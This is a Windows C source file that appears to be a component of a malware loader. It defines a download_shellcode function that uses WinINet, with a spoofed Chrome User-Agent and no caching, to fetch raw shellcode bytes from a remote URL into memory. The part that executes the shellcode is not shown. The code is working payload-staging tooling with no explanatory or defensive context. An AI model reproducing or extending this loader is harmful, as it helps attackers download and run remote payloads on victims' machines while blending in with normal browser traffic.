#define _CRT_SECURE_NO_WARNINGS
#include "pch.h"
#include "download.h"

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "wininet.lib")

DownloadResult* download_shellcode(const char* url) {
    DownloadResult* result = NULL;
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    unsigned char* buffer = NULL;
    size_t total_size = 0;
    DWORD bytes_read = 0;
    DWORD bytes_available = 0;

    result = (DownloadResult*)malloc(sizeof(DownloadResult));
    if (!result) {
        return NULL;
    }
    result->data = NULL;
    result->size = 0;

    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        free(result);
        return NULL;
    }

    hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        free(result);
        return NULL;
    }

    char temp_buffer[4096];
    while (InternetReadFile(hUrl, temp_buffer, sizeof(temp_buffer), &bytes_read) && bytes_read > 0) {
        unsigned char* new_buffer = (unsigned char*)realloc(result->data, total_size + bytes_read);
        if (!new_buffer) {
            free(result->data);
            free(result);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return NULL;
        }

        result->data = new_buffer;
        memcpy(result->data + total_size, temp_buffer, bytes_read);
        total_size += bytes_read;
    }

    result->size = total_size;

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (result->size == 0) {
        free_download_result(result);
        return NULL;
    }

    return result;
}

void free_download_result(DownloadResult* result) {
    if (result) {
        if (result->data) {
            free(result->data);
        }
        free(result);
    }
}